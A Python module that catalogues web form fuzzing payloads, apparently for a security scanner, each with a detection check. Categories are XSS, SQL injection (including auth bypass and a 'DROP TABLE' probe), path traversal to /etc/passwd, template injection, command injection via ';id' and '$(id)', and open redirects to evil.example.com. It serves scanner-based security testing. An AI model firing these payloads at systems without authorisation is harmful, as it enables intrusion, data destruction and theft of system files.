"""HTML form fuzzing payload catalog."""

from __future__ import annotations

import re
from typing import Callable, Dict, List, Tuple

_FORM_PAYLOADS: Dict[str, List[Tuple[str, str, Callable[[str], bool]]]] = {
    "xss": [
        ('"><script>alert(1)</script>',            "reflected XSS basic",
         lambda t: "<script>alert(1)" in t),
        ("'><svg onload=alert(1)>",                "reflected XSS SVG",
         lambda t: "onload=alert(1)" in t),
        ('<img src=x onerror=alert(1)>',           "reflected XSS img",
         lambda t: "onerror=alert(1)" in t),
        ("javascript:alert(1)",                    "XSS in URL context",
         lambda t: "javascript:alert(1)" in t),
        ('{{7*7}}',                                "SSTI via XSS field",
         lambda t: "49" in t),
        ('<script>alert(document.domain)</script>', "DOM XSS surface",
         lambda t: "alert(document.domain)" in t),
    ],
    "sqli": [
        ("'",                                      "SQLi quote error",
         lambda t: bool(re.search(
             r"sql syntax|mysql_fetch|ORA-\d{5}|sqlite_|syntax error"
             r"|unclosed quotation|pg_query", t, re.I))),
        ("' OR '1'='1' --",                        "SQLi auth bypass",
         lambda t: bool(re.search(r"welcome|dashboard|admin|logged.in", t, re.I))),
        ("' UNION SELECT NULL,NULL,NULL --",        "SQLi UNION probe",
         lambda t: bool(re.search(r"sql syntax|column|union", t, re.I))),
        ("1 AND SLEEP(0)=0 --",                    "SQLi timing probe",
         lambda t: False),
        ("'; DROP TABLE --",                        "SQLi destructive probe",
         lambda t: bool(re.search(r"error|syntax", t, re.I))),
        ("1' AND '1'='2",                          "SQLi boolean false",
         lambda t: False),
    ],
    "lfi": [
        ("../../../../etc/passwd",                  "LFI Unix",
         lambda t: bool(re.search(r"root:.*:0:0:", t))),
        ("../../../../windows/win.ini",             "LFI Windows",
         lambda t: bool(re.search(r"\[boot loader\]|for 16-bit app", t, re.I))),
        ("php://filter/read=convert.base64-encode/resource=index.php", "LFI PHP wrapper",
         lambda t: bool(re.search(r"[A-Za-z0-9+/]{40,}={0,2}", t))),
        ("/etc/passwd",                             "LFI absolute path",
         lambda t: bool(re.search(r"root:.*:0:0:", t))),
        ("....//....//etc/passwd",                  "LFI dotdot slash bypass",
         lambda t: bool(re.search(r"root:.*:0:0:", t))),
    ],
    "redirect": [
        ("https://evil.example.com",                "open redirect",
         lambda t: False),
        ("//evil.example.com",                      "protocol-relative redirect",
         lambda t: False),
        ("/\\evil.example.com",                     "backslash redirect bypass",
         lambda t: False),
        ("javascript:alert(1)",                     "XSS via redirect",
         lambda t: "javascript:alert(1)" in t),
    ],
    "ssti": [
        ("{{7*7}}",                                 "SSTI Jinja2/Twig",
         lambda t: "49" in t),
        ("${7*7}",                                  "SSTI Freemarker",
         lambda t: "49" in t),
        ("*{7*7}",                                  "SSTI SpEL",
         lambda t: "49" in t),
        ("<%= 7*7 %>",                              "SSTI ERB",
         lambda t: "49" in t),
        ("{{7*'7'}}",                               "SSTI Jinja2 string multiply",
         lambda t: "7777777" in t),
    ],
    "cmdi": [
        (";id;echo CMDI_HIT",                       "CMDi Unix semicolon",
         lambda t: "CMDI_HIT" in t or bool(re.search(r"uid=\d+\(", t))),
        ("|id",                                     "CMDi pipe",
         lambda t: bool(re.search(r"uid=\d+\(", t))),
        ("`id`",                                    "CMDi backtick",
         lambda t: bool(re.search(r"uid=\d+\(", t))),
        ("$(id)",                                   "CMDi subshell",
         lambda t: bool(re.search(r"uid=\d+\(", t))),
        ("& ping -c 1 127.0.0.1",                   "CMDi Windows ping",
         lambda t: "bytes from" in t.lower() or "TTL=" in t),
    ],
    "numeric": [
        ("-1",                                      "negative value",
         lambda t: False),
        ("0",                                       "zero boundary",
         lambda t: False),
        ("9999999",                                 "large value",
         lambda t: False),
        ("1.0e309",                                 "float overflow",
         lambda t: bool(re.search(r"error|overflow|nan|inf", t, re.I))),
        ("' OR 1=1--",                              "SQLi in numeric field",
         lambda t: bool(re.search(r"sql|error", t, re.I))),
    ],
    "email": [
        ("test@example.com' OR '1'='1",             "SQLi in email",
         lambda t: bool(re.search(r"sql syntax|mysql|error", t, re.I))),
        ("test+<script>alert(1)</script>@x.com",    "XSS in email",
         lambda t: "alert(1)" in t),
        ("test@[127.0.0.1]",                        "SSRF via email domain",
         lambda t: False),
    ],
    "bool": [
        ("true",                                    "bool escalation true",
         lambda t: False),
        ("1",                                       "bool escalation 1",
         lambda t: False),
        ("admin",                                   "bool privilege escalation",
         lambda t: False),
    ],
}

__all__ = [
    "_FORM_PAYLOADS",
]
